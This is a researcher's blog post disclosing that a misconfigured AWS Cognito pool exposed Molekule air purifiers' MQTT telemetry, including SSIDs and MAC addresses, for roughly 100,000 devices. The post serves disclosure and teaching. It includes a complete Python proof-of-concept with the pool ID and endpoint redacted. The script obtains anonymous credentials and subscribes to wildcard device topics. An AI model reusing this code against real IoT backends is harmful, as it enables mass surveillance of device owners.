---
layout: post
title: "Vulnerability Report: Unauthenticated MQTT Broker Access in Molekule IoT Air Purifiers"
date:   2026-01-29 16:49:00 +0200
categories: [blog]
tags: [cybersecurity, iot-security, vulnerability-report, aws, mqtt, molekule]
---

## Summary
![Molekule Air purifier](/assets/molekule_title.png)  

**Security Vulnerability Disclosure**

**Vendor:** Molekule Group, Inc.  
**Product Line:** Molekule Air Purifier  
**Date of Discovery:** 25-10-2025  
**Date of Report:** 30-10-2025  
**Last Updated:** 28-01-2026

An unauthenticated attacker could access Molekule's AWS IoT Core MQTT broker and subscribe to wildcard topics, receiving real-time device shadow updates from approximately 100,000 deployed IoT devices globally. The vulnerability stemmed from an improperly configured AWS Cognito Identity Pool that allowed anonymous access without authentication. This exposed sensitive data including WiFi SSIDs, MAC addresses, device names, sensor readings, and operational metadata for the entire device fleet.

This is a case study on how seemingly innocuous AWS configuration mistakes can have massive security implications. More importantly, it demonstrates how application developers often expose their entire backend infrastructure through hardcoded credentials in mobile apps.

## Vulnerability Details

### Overview

**Root Cause:** Unauthenticated AWS Cognito Identity Pool with overly permissive IoT policy

Molekule's IoT backend uses AWS IoT Core for device communication via MQTT. Access to the MQTT broker is controlled through an AWS Cognito Identity Pool that permits unauthenticated access. Any party can obtain temporary AWS credentials and establish MQTT connections to subscribe to device shadow topics without providing any form of authentication.

This isn't just a minor misconfiguration - it grants complete visibility into their entire IoT fleet's real-time telemetry. This vulnerability is classified as **CWE-200: Exposure of Sensitive Information to an Unauthorized Actor.**

**Important Note:** The IoT policy only granted read access (subscribe) to device topics. Publishing to device shadow update topics or sending commands to control devices was not possible with the exposed credentials. Device control would require per-device certificates that are provisioned and stored on each individual device. This vulnerability was limited to passive data exfiltration and surveillance. No direct device manipulation was achievable.

### Hardcoded Configuration Exposure

The vulnerable AWS infrastructure details were discovered through static analysis of the official Molekule Android application. This is a common attack vector - mobile apps are essentially user-friendly interfaces to backend APIs, and developers often forget that the .apk file is completely accessible to anyone.

**Location of Exposed Credentials:**

The Molekule Android application (.apk) contains the complete minified source code of the React Native application at:

**File Path:** `/assets/index.android.bundle`

Within this JavaScript bundle, an environment configuration object (variable name: `I`) contains hardcoded credentials and endpoints for three deployment environments:

1. **Production** (vulnerable configuration)
2. **Integration**
3. **Development**

Each environment configuration object includes:

**AWS Infrastructure Details:**
- Cognito Identity Pool IDs
- Cognito User Pool IDs
- IoT Core MQTT endpoint URLs
- AWS region identifiers
- API Gateway endpoints

**Third-Party Service Credentials:**
- Magento API keys
- Iterable API keys
- Analytics service tokens (Segment, Amplitude)
- Split.io SDK keys
- Klaviyo public API keys

Everything you need to interact with their backend is right there in the application bundle.

![Hardcoded credentials in the Android app bundle](/assets/molekule_hardcoded-credentials-redacted.png)

### Technical Description

**Attack Flow:**

The exploitation is straightforward and requires no special tools beyond standard AWS SDKs:

1. **Credential Acquisition (No Authentication Required)**
   ```
   Attacker → AWS Cognito Identity Service
   Request: GetId (with Identity Pool ID)
   Response: Unauthenticated Identity ID
   
   Attacker → AWS Cognito Identity Service  
   Request: GetCredentialsForIdentity (with Identity ID)
   Response: Temporary AWS credentials (AccessKeyId, SecretKey, SessionToken)
   ```

2. **MQTT Connection Establishment**
   - Use temporary credentials to authenticate via AWS Signature Version 4
   - Establish WebSocket connection to IoT endpoint
   - Connection accepted with full MQTT capabilities

3. **Topic Subscription**
   - Subscribe to wildcard topics:
     - `$aws/things/+/shadow/update/accepted`
     - `$aws/things/+/shadow/get/accepted`
     - `molekule/things/+/data`
   - Broker accepts subscription without device-level authorization
   - Begin receiving real-time updates from all devices

4. **Data Exfiltration**
   - Device shadow updates contain full state objects
   - Approximately 100,000 devices actively publishing data
   - No rate limiting or anomaly detection observed

**Security Failures:**

This vulnerability is the result of multiple security failures stacking on top of each other:

1. **Cognito Identity Pool Misconfiguration**
   - Unauthenticated access enabled
   - No user authentication required (no email, OAuth, etc.)
   - AWS allows this configuration, but it should never be used for production IoT systems

2. **Missing IoT Policy Restrictions**
   - Policy allows subscription to wildcard topics (`+` and `#` operators)
   - No device-level authorization checks
   - Policy permits access to all thing shadows globally
   - Proper implementation would restrict each authenticated user to only their own devices

3. **Absence of Monitoring**
   - No detection of wildcard topic subscriptions from unusual sources
   - No rate limiting per identity
   - No alerting on mass data access patterns
   - AWS provides CloudWatch metrics for IoT Core - they weren't being used effectively

**Data Exposure Details:**

Device shadow updates contain JSON objects with extensive information about each device and its environment:

- **Network Information:**
  - WiFi SSID (often contains addresses or business names)
  - MAC addresses (unique hardware identifiers)
  - Network signal strength (RSSI)
  - Connection status and diagnostics

- **Device Metadata:**
  - User-assigned device names (often contain personal information like room locations)
  - Serial numbers
  - Firmware versions
  - Hardware models
  - Manufacturing data and batch information

- **Operational Data:**
  - Real-time sensor readings (air quality, PM2.5, VOCs, temperature, humidity)
  - Device state (power on/off, fan speed, mode settings)
  - Filter status and remaining lifetime
  - Error codes and diagnostic information
  - Timestamp data revealing usage patterns

- **Inferred Location Data:**
  - SSIDs often directly contain street addresses or business names
  - Combined with device names: precise location inference possible
  - Cross-referencing with public SSID databases (WiGLE, etc.): physical address resolution
  - Temporal patterns reveal when users are home/away

- **Additional Unmapped Data:**
  - Shadow messages contain additional fields not yet fully analyzed
  - Full extent of data exposure requires further investigation
  - Potential for proprietary sensor data or business intelligence

The severity of this data exposure is debatable. The exposed information doesn't directly include names, email addresses, or payment information. However, under GDPR and CCPA, MAC addresses and device identifiers are legally considered personal data. SSIDs and device names frequently contain personally identifiable information. The combination of this data allows for precise user tracking, behavior analysis, and potential physical security threats.

**Example Device Shadow Message:**

![Example device shadow JSON payload](/assets/molekule_shadow.png)

The image above shows a real device shadow update captured during testing. As you can see, each message contains extensive telemetry and metadata about the device and its environment.

## Proof of Concept

### Prerequisites

```bash
pip3 install boto3 awscrt awsiotsdk
```

### Exploitation Script

The following proof-of-concept demonstrates how trivial this vulnerability is to exploit. This is production-ready Python code - no advanced techniques, no vulnerability research expertise required. Anyone with basic Python knowledge could do this:

```python
#!/usr/bin/env python3
"""
Proof of Concept: Unauthenticated access to Molekule IoT MQTT broker
Demonstrates ability to receive device shadow updates from all devices globally
"""

import json
import boto3
from awscrt import mqtt, io, auth
from awsiot import mqtt_connection_builder

# Publicly accessible configuration (no credentials required)
REGION = "us-west-2"
IDENTITY_POOL_ID = "REDACTED"
IOT_ENDPOINT = "REDACTED"

def get_unauthenticated_credentials():
    """Obtain AWS credentials without any authentication."""
    cognito = boto3.client('cognito-identity', region_name=REGION)
    
    # Step 1: Get identity (no auth required)
    identity_response = cognito.get_id(IdentityPoolId=IDENTITY_POOL_ID)
    identity_id = identity_response['IdentityId']
    print(f"[+] Obtained Identity ID: {identity_id}")
    
    # Step 2: Get temporary credentials (no auth required)
    creds_response = cognito.get_credentials_for_identity(IdentityId=identity_id)
    credentials = creds_response['Credentials']
    print(f"[+] Obtained temporary AWS credentials")
    
    return credentials, identity_id

def connect_to_mqtt(credentials, identity_id):
    """Establish MQTT connection using unauthenticated credentials."""
    event_loop_group = io.EventLoopGroup(1)
    host_resolver = io.DefaultHostResolver(event_loop_group)
    client_bootstrap = io.ClientBootstrap(event_loop_group, host_resolver)
    
    mqtt_connection = mqtt_connection_builder.websockets_with_default_aws_signing(
        endpoint=IOT_ENDPOINT,
        client_bootstrap=client_bootstrap,
        region=REGION, 
        credentials_provider=auth.AwsCredentialsProvider.new_static(
            access_key_id=credentials['AccessKeyId'],
            secret_access_key=credentials['SecretKey'],
            session_token=credentials['SessionToken']
        ),
        client_id=identity_id,
        clean_session=True,
        keep_alive_secs=30
    )
    
    connect_future = mqtt_connection.connect()
    connect_future.result()
    print(f"[+] Connected to AWS IoT Core MQTT broker")
    
    return mqtt_connection

def on_message_received(topic, payload, **kwargs):
    """Callback for received MQTT messages."""
    try:
        # Print Payload
        payload_str = payload.decode('utf-8') if isinstance(payload, bytes) else str(payload)
        
        device_id = topic.split('/')[2] if len(topic.split('/')) >= 3 else "unknown"
        
        print(f"\n[!] Message from device: {device_id}")
        print(f"    Topic: {topic}")
        print(f"    Payload:")
        print(f"    {payload_str}")
        print(f"    Total size: {len(payload_str)} bytes")
        
        # Also extract key fields for quick reference
        data = json.loads(payload)
        state = data.get('state', {})
        reported = state.get('reported', {})
        
        if 'ssid' in reported:
            print(f"    → SSID: {reported['ssid']}")
        if 'mac_address' in reported:
            print(f"    → MAC: {reported['mac_address']}")
            
    except Exception as e:
        print(f"[!] Error parsing message: {e}")

def main():
    print("="*60)
    print("PoC: Unauthenticated MQTT Access - Molekule IoT")
    print("="*60)
    
    # Step 1: Get credentials (no authentication)
    credentials, identity_id = get_unauthenticated_credentials()
    
    # Step 2: Connect to MQTT broker
    mqtt_connection = connect_to_mqtt(credentials, identity_id)
    
    # Step 3: Subscribe to wildcard topics (access all devices)
    topics = [
        "$aws/things/+/shadow/update/accepted",
        "$aws/things/+/shadow/get/accepted",
        "molekule/things/+/data",
    ]
    
    print(f"\n[+] Subscribing to wildcard topics...")
    print(f"[+] Press Ctrl+C to stop\n")

    for topic in topics:
        subscribe_future, _ = mqtt_connection.subscribe(
            topic=topic,
            qos=mqtt.QoS.AT_LEAST_ONCE,
            callback=on_message_received
        )
        subscribe_future.result()
        print(f"    Subscribed to: {topic}")

    try:
        import time
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n[+] Disconnecting...")
        disconnect_future = mqtt_connection.disconnect()
        disconnect_future.result()
        print(f"[+] Done")

if __name__ == "__main__":
    main()
```

### Reproduction Steps

1. Execute PoC:
```bash   
python3 poc_molekule_mqtt.py
```

2. Observe Results:
   - Script obtains valid AWS credentials anonymously
   - Connects to MQTT broker successfully
   - Subscribes to wildcard device topics
   - Begins receiving real-time shadow updates from all devices

Within seconds of running this script, you'll start seeing messages from devices all over the world. Home air purifiers, office deployments, commercial installations. All are broadcasting their status to anyone who asks.

## Impact Assessment

### Data Exposure

- **Scale:** Approximately 100,000 devices globally
- **Data Types:** MAC addresses, WiFi SSIDs, device names, sensor data, firmware versions, location inference
- **Privacy Concern:** MAC addresses and device identifiers are considered personal data under GDPR/CCPA. SSIDs often contain addresses or business names. Unique device identifiers enable tracking and re-identification, particularly when combined with timestamps, network metadata, or external data sources.
- **Business Impact:** Proprietary deployment data exposed to competitors. Real-time market intelligence available to anyone with this information.

### Technical Severity

- **Easy to exploit:** Working PoC in ~100 lines of Python using standard AWS SDKs
- **No special tools required:** Runs on any system with Python and standard libraries
- **No detection:** No rate limiting, no alerting, no anomaly detection observed
- **Architectural flaw:** Not a simple bug - the entire authentication model is fundamentally broken
- **Fix complexity:** Requires backend configuration changes and potentially app updates depending on remediation approach


## Closing Thoughts

This vulnerability is a textbook example of how cloud misconfigurations can have massive security implications. AWS provides incredibly powerful services like IoT Core and Cognito, but with power comes responsibility. The "pit of success" doesn't exist in cloud security - you need to actively understand and configure these services correctly.

More broadly, this demonstrates an ongoing problem in IoT security: mobile apps are not secret vaults. Every API endpoint, every credential, every configuration parameter in your app bundle should be considered public information. Design your architecture accordingly.

If you're a Molekule customer, your data was potentially exposed for several years. While the vulnerability appears to be fixed now, there's no way to know if anyone else discovered and exploited this before I did. This is why timely security fixes and transparent communication matter.

Stay secure, and always assume your IoT devices are less secure than you hope they are.

## Responsible Disclosure Timeline

The disclosure process for this vulnerability was... interesting. While Molekule did eventually fix the issue, the communication could have been better:

- **25-10-2025:** Initial discovery and validation of vulnerability while reverse engineering their Android app.
- **26-10-2025:** Attempted to contact the vendor and request PGP key for responsible disclosure.
- **29-10-2025:** Received an email from Molekule's Security team. They responded quickly, which was promising.
- **30-10-2025:** Report was sent to the manufacturer with a 90-day disclosure notice.
- **12-11-2025:** I asked Molekule for a status update on the vulnerability.
- **13-11-2025:** Molekule offered me a bounty but asked me to sign an NDA that was absolutely in their favor - basically preventing me from ever discussing this vulnerability, even after a fix. This is not how responsible disclosure should work.
- **14-11-2025:** I declined the NDA and proposed to continue with the responsible disclosure timeline. I also suggested they file for a CVE-ID, which they didn't seem interested in doing.
- **19-12-2025:** Molekule asked for more specific details on how credentials were obtained.
- **20-12-2025:** I provided them with detailed information about the hardcoded credentials in the Android app bundle.
- **06-01-2026:** I asked for a status update. Radio silence.
- **25-01-2026:** Still no answer. Testing shows they appear to have fixed their AWS policy, as the PoC no longer works. However, since they stopped communicating with me entirely, I haven't investigated the fix in detail or verified its completeness.
- **30-01-2026:** Public disclosure (this post).